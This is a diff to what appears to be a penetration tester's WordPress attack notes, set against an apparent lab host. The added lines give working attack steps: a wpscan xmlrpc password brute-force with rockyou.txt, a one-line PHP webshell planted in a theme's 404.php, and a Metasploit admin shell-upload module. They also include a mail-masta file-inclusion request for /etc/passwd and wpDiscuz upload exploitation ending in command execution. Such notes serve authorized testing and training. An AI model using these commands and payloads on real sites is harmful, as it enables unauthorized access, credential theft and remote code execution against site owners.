@@ -4,6 +4,81 @@
 
 [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
 
+## Discovery & Enumeration
+### Discovery/Footprinting
+```sh
+curl $IP/robots.txt
+/wp-admin
+/wp-content
+/wp-login.php
+# Enum vulnerable plugins
+/wp-content/plugins
+# Enum themes
+/wp-content/themes
+
+# Important WordPress users
+- Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
+- Editor: An editor can publish and manage posts, including the posts of other users.
+- Author: They can publish and manage their own posts.
+# Editors and authors might have access to certain vulnerable plugins, which normal users don’t.
+```
+### Enumeration
+```sh
+# LOOK AT THE SOURCE CODE
+curl -s http://blog.inlanefreight.local | grep WordPress
+curl -s http://blog.inlanefreight.local/ | grep themes
+curl -s http://blog.inlanefreight.local/ | grep plugins
+curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
+# SEARCH VERSIONS, SEE IF THEY ARE VULNERABLE AND NOTE THEM DOWN FOR LATER; DO NOT QUICKLY EXPLOIT THE FIRST THING YOU FIND
+```
+### Enumerating Users
+Go to `wp-login.php` and enter a user and any password. The error if a user exists or not is different.
+### WPScan
+```sh
+https://github.com/wpscanteam/wpscan
+sudo gem install wpscan
+# https://wpvulndb.com which is used by WPScan to scan for PoC and reports -> OBTAIN API TOKEN
+--api-token parameter
+
+# Normal enumeration with API token
+wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
+# NOTE WP VERSION, PLUGINS, THEMES, USERS, DIRECTORY LISTING ENABLED, XML-RPC ENABLED TO PERFORM BRUTE-FORCING
+```
+## Attacking
+We need administrator-level credentials.
+```sh
+############# LOGIN BRUTEFORCE
+# 2 ways: wp-login to bf the standard login page and xmlrpc to make attemps on /xmlrpc.php (preferred because it is faster)
+wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+
+############# CODE EXECUTION
+# Appearance > Theme Editor > choose an inactive theme to avoid corrupting the primary theme > Select theme > edit 404.php to add a webshell
+system($_GET[0]);
+# Add that single line at the beginning below the comments to avoid too much modification of the contents.
+# Click on Update File at the bottom to save > go to `/wp-content/themes/<theme name>` to find the file
+curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+# Alternative with Metasploit https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/ > set RHOSTS and in this case also VHOST as well as USERNAME/PASSWORD
+msf> use exploit/unix/webapp/wp_admin_shell_upload 
+```
+### Leveraging Known Vulnerabilities
+Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.
+#### Vulnerable Plugins - mail-masta
+```sh
+https://www.exploit-db.com/exploits/41438
+https://www.exploit-db.com/exploits/50226
+
+curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+#### Vulnerable plugins - wpDiscuz
+```sh
+https://www.exploit-db.com/exploits/49967
+https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
+
+python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+# If exploit fails do not worry, file could have been uploaded anyway
+curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+```
+
 ## Basic info
 
 **Uploaded** files go to: _`http://10.10.10.10/wp-content/uploads/2018/08/a.txt`_\
@@ -83,11 +158,12 @@ https://nmap.org/nsedoc/scripts/http-wordpress-enum.html
 # MANUAL ENUMERATION  WITH WFUZZ WITH A WORDPRESS VULNERABLE PLUGINS LIST 
 https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/main/wp-plugins.lst
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt
-wfuzz -c --hc=404 -w dict http://$URL/wp/FUZZ
+ffuf -c -r -u -w dict http://$URL/wpFUZZ
 
 # WPSCAN
 # ap (all plugins), all themes (at), config backups (cb), Db exports (dbe)
 wpscan --url sandbox.local --enumerate ap,at,cb,dbe
+wpscan --url sandbox.local --enumerate u,ap --force --plugins-detection mixed
 # vulnerable plugins, themes, users viral timthumb vuln, config back, db exp
 wpscan --url http:// -e vt,tt,u,vp,cb,dbe
 # ENUMERATE VULNERABLE PLUGINS (SOMETIMES MAY FAIL, TRY ALSO TO ENUM ALL)
@@ -260,3 +336,6 @@ hashcat -m 400 hashes rockyou.txt
 ## XSS admin user
 
 [https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)
+
+## General note about CMS
+Do not try only to upload shell.php but a folder with shell.php inside (it is the understanding of a plugin, a directory with files).
